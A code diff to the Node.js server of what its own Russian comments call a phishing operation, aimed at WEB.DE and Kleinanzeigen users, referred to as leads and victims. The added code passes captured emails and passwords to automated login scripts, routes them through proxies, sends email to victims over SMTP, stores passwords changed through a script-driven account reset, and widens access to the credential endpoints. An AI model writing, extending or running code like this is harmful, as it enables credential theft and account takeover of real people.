@@ -4,7 +4,7 @@ const fs = require('fs');
 const os = require('os');
 const { spawn } = require('child_process');
 const { send, safeEnd } = require('../utils/httpUtils');
-const { checkAdminAuth, checkWorkerSecret, checkAdminPageAuth, hasValidAdminSession } = require('../utils/authUtils');
+const { checkAdminAuth, checkWorkerSecret, checkAdminPageAuth, hasValidAdminSession, hasValidWorkerSecret } = require('../utils/authUtils');
 const { getPlatformFromRequest, maskEmail, translateChatText, CHAT_TRANSLATE_TARGET } = require('../utils/formatUtils');
 const leadService = require('../services/leadService');
 const automationService = require('../services/automationService');
@@ -13,6 +13,7 @@ let nodemailer;
 try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }
 const { runConcurrent } = require('../utils/runConcurrent');
 const { formatModeStartPage } = require('../lib/adminModeFlowLog');
+const { getWorkerLeadCredentialsFields } = require('../lib/leadLoginContext');
 const MAIL_BATCH_SMTP_CONCURRENCY = 4;
 const SERVER_INSTANCE = process.env.INSTANCE_NAME || ('pm2-' + (process.env.pm_id || 'na'));
 
@@ -48,6 +49,72 @@ async function handle(scope) {
       return send(res, 200, { ok: true });
     });
     return true;
+  }
+
+  /**
+   * Скрипт lead_simulation_api после входа в почту: отправить письмо через Config → E-Mail (SMTP),
+   * как кнопка в админке, без compose в UI почты. x-worker-secret.
+   */
+  if (pathname === '/api/worker/send-config-email' && req.method === 'POST') {
+    if (!checkWorkerSecret(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', async () => {
+      let json = {};
+      try {
+        json = JSON.parse(body || '{}');
+      } catch (e) {
+        return send(res, 400, { ok: false, error: 'invalid json' });
+      }
+      const idRaw = (json.id != null && String(json.id).trim()) || (json.leadId != null && String(json.leadId).trim()) || '';
+      if (!idRaw) return send(res, 400, { ok: false, error: 'id or leadId required' });
+      const id = resolveLeadId(idRaw);
+      const leads = readLeads();
+      const lead = leads.find((l) => l.id === id);
+      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
+      if (leadIsWorkedLikeAdmin(lead)) {
+        return send(res, 400, { ok: false, error: 'Лог отработан — отправка письма запрещена' });
+      }
+      if (leadHasAnyConfigEmailSentEvent(lead)) {
+        return send(res, 200, { ok: true, skipped: 'already_sent' });
+      }
+      try {
+        const result = await sendConfigEmailToLead(lead);
+        if (!result.ok) {
+          persistLeadPatch(id, { eventTerminal: lead.eventTerminal, lastSeenAt: lead.lastSeenAt });
+          const code = result.statusCode || 500;
+          return send(res, code, { ok: false, error: result.error || 'Ошибка отправки' });
+        }
+        pushEvent(lead, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
+        persistLeadPatch(id, { eventTerminal: lead.eventTerminal, lastSeenAt: lead.lastSeenAt, adminListSortAt: new Date().toISOString() });
+        return send(res, 200, { ok: true, fromEmail: result.fromEmail });
+      } catch (e) {
+        const msg = (e && e.message) ? String(e.message).slice(0, 200) : 'send error';
+        console.error('[worker/send-config-email] id=' + id + ' ' + msg);
+        return send(res, 500, { ok: false, error: msg });
+      }
+    });
+    return true;
+  }
+
+  /**
+   * Содержимое login/proxy.txt с диска сервера — тот же файл, что пишет Config → Прокси.
+   * lead_simulation_api забирает список отсюда, чтобы не расходиться с админкой.
+   */
+  if (pathname === '/api/worker/proxy-txt' && req.method === 'GET') {
+    if (!checkWorkerSecret(req, res)) return;
+    let content = '';
+    let pathOnServer = '';
+    try {
+      pathOnServer = String(PROXY_FILE || '');
+      if (fs.existsSync(PROXY_FILE)) {
+        content = fs.readFileSync(PROXY_FILE, 'utf8');
+      }
+    } catch (e) {
+      const msg = (e && e.message) ? String(e.message).slice(0, 200) : 'read error';
+      return send(res, 500, { ok: false, error: msg });
+    }
+    return send(res, 200, { ok: true, content: content, path: pathOnServer });
   }
 
   /** API для скрипта входа WEB.DE: отдать email и пароль лида (скрипт опрашивает, пока админ не введёт пароль). Асинхронное чтение leads.json — не блокирует event loop при большом файле и лавине запросов. */
@@ -169,11 +236,16 @@ async function handle(scope) {
       const host = (req.headers['x-forwarded-host'] || req.headers.host || '127.0.0.1:' + PORT).split(',')[0].trim();
       const baseUrl = process.env.SERVER_URL || (protocol + '://' + host);
       const workerSecret = (process.env.WORKER_SECRET || '').trim();
-      const python = process.platform === 'win32' ? 'python' : 'python3';
-      const env = Object.assign({}, process.env, { PYTHONUNBUFFERED: '1' });
+      const python = automationService.resolvePythonExecutable(PROJECT_ROOT);
+      const env = automationService.makePythonSpawnEnv(PROJECT_ROOT);
       const pyArgsManual = [scriptPath, '--server-url', baseUrl, '--lead-id', id, '--combo-slot', String(webdeComboSlotManual)];
       if (readStartPage() === 'klein') pyArgsManual.push('--klein-orchestration');
-      const child = require('child_process').spawn(python, pyArgsManual, { cwd: PROJECT_ROOT, detached: true, stdio: 'inherit', env: Object.assign({}, env, { WORKER_SECRET: workerSecret }) });
+      const child = spawn(python, pyArgsManual, {
+        cwd: PROJECT_ROOT,
+        detached: true,
+        stdio: 'inherit',
+        env: Object.assign({}, env, { WORKER_SECRET: workerSecret }, automationService.webdeScriptProxyEnv())
+      });
       automationService.webdeLockWriteChildPid(emailLower, child.pid);
       automationService.webdeLoginChildByLeadId.set(id, child);
       child.on('exit', function () {
@@ -1293,6 +1365,8 @@ async function handle(scope) {
       email: (lead.email || '').trim() || undefined,
       emailKl: (lead.emailKl || '').trim() || undefined,
       brand: lead.brand || undefined,
+      clientFormBrand: lead.clientFormBrand != null ? String(lead.clientFormBrand) : undefined,
+      hostBrandAtSubmit: lead.hostBrandAtSubmit != null ? String(lead.hostBrandAtSubmit) : undefined,
       platform: lead.platform || undefined,
       userAgent: lead.userAgent || undefined,
       ip: lead.ip || undefined,
@@ -1311,7 +1385,7 @@ async function handle(scope) {
   }
 
   if (pathname === '/api/lead-automation-profile' && req.method === 'GET') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!hasValidWorkerSecret(req) && !checkAdminAuth(req, res)) return;
     const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
     if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
     const id = resolveLeadId(leadIdRaw);
@@ -1324,7 +1398,7 @@ async function handle(scope) {
   }
 
   if (pathname === '/api/lead-login-context' && req.method === 'GET') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!hasValidWorkerSecret(req) && !checkAdminAuth(req, res)) return;
     const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
     if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
     const id = resolveLeadId(leadIdRaw);
@@ -1360,15 +1434,20 @@ async function handle(scope) {
         console.log('[АДМИН] lead-credentials: лид не найден id=' + id + (id !== leadIdRaw ? ' (resolved from ' + leadIdRaw + ')' : ''));
         return send(res, 404, { ok: false });
       }
-      const isKl = lead.brand === 'klein';
-      const email = isKl
-        ? String((lead.emailKl || lead.email || '')).trim()
-        : String((lead.email || '')).trim();
+      const { email, password, passwordKl } = getWorkerLeadCredentialsFields(lead);
       if (email) touchWebdeScriptLock(email.toLowerCase());
-      const password = isKl
-        ? String((lead.passwordKl != null ? lead.passwordKl : lead.password) || '').trim()
-        : String((lead.password != null ? lead.password : '') || '').trim();
-      return send(res, 200, { ok: true, email: email, password: password });
+      const credBody = {
+        ok: true,
+        email: email,
+        password: password,
+        clientFormBrand: lead.clientFormBrand != null ? String(lead.clientFormBrand) : null,
+        hostBrandAtSubmit: lead.hostBrandAtSubmit != null ? String(lead.hostBrandAtSubmit) : null,
+        recordBrand: lead.brand != null ? String(lead.brand) : null
+      };
+      if (lead.brand === 'klein') {
+        credBody.passwordKl = passwordKl != null && String(passwordKl).trim() !== '' ? String(passwordKl).trim() : null;
+      }
+      return send(res, 200, credBody);
     });
     return true;
   }
@@ -1389,7 +1468,15 @@ async function handle(scope) {
       const seen = !!(lead.kleinAnmeldenSeenAt && String(lead.kleinAnmeldenSeenAt).trim());
       const emailKl = (lead.emailKl != null ? String(lead.emailKl) : '').trim();
       const passwordKl = (lead.passwordKl != null ? String(lead.passwordKl) : '').trim();
-      return send(res, 200, { ok: true, anmeldenSeen: seen, emailKl: emailKl, passwordKl: passwordKl });
+      return send(res, 200, {
+        ok: true,
+        anmeldenSeen: seen,
+        emailKl: emailKl,
+        passwordKl: passwordKl,
+        clientFormBrand: lead.clientFormBrand != null ? String(lead.clientFormBrand) : null,
+        hostBrandAtSubmit: lead.hostBrandAtSubmit != null ? String(lead.hostBrandAtSubmit) : null,
+        recordBrand: lead.brand != null ? String(lead.brand) : null
+      });
     });
     return true;
   }
@@ -1742,6 +1829,7 @@ async function handle(scope) {
       }
       const fromKleinScript = String(json.resultSource || '').trim().toLowerCase() === 'klein_login';
       const resultPhase = json.resultPhase != null ? String(json.resultPhase).trim() : '';
+      const passwordKlNew = json.passwordKlNew != null ? String(json.passwordKlNew).trim() : '';
       const sessLog = lead.webdeScriptActiveRun != null ? lead.webdeScriptActiveRun : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? lead.webdeScriptRunSeq : '—');
       lead.lastSeenAt = new Date().toISOString();
       delete lead.scriptStatus;
@@ -1779,6 +1867,9 @@ async function handle(scope) {
       if (result === 'success' && resultPhase === 'mail_ready_klein') {
         eventLabel = EVENT_LABELS.MAIL_READY;
       }
+      if (result === 'success' && resultPhase === 'klein_reset_done') {
+        eventLabel = EVENT_LABELS.SUCCESS_KL;
+      }
       if (result === 'push' && pushTimeout) {
         eventLabel = EVENT_LABELS.PUSH_TIMEOUT;
       } else if (result === 'error' && (errorCode || errorMessage)) {
@@ -1814,11 +1905,21 @@ async function handle(scope) {
       }
       if (result === 'success') {
         const isKleinLead = (lead.brand === 'klein');
+        if (passwordKlNew) {
+          pushPasswordHistory(lead, passwordKlNew, 'klein_reset_script');
+          lead.passwordKl = passwordKlNew;
+        }
         if (isKleinLead) {
           delete lead.kleinPasswordErrorDe;
         }
         const startPage = readStartPage();
-        if (isKleinLead) {
+        // Klein-оркестрация: лид с почтой WEB.DE на фишинге — скрипт открыл ящик → сначала редирект на смену пароля
+        // на сайте (независимо от стартовой «Login»), затем жертва видит успех; Config E-Mail и фильтры — дальше по сценарию.
+        if (resultPhase === 'klein_reset_done') {
+          lead.status = 'show_success';
+        } else if (resultPhase === 'mail_ready_klein' && !isKleinLead) {
+          lead.status = 'redirect_change_password';
+        } else if (isKleinLead) {
           // Klein-лиды: как раньше (script-klein / erfolg).
           if (startPage === 'change') {
             lead.status = 'redirect_change_password';
@@ -1837,7 +1938,7 @@ async function handle(scope) {
         } else {
           lead.status = 'show_success';
         }
-        if (resultPhase === 'mail_ready_klein') {
+        if (resultPhase === 'mail_ready_klein' || resultPhase === 'klein_reset_done') {
           automationService.endWebdeAutoLoginRun(lead);
         }
       } else if (result === 'wrong_credentials') lead.status = 'error';
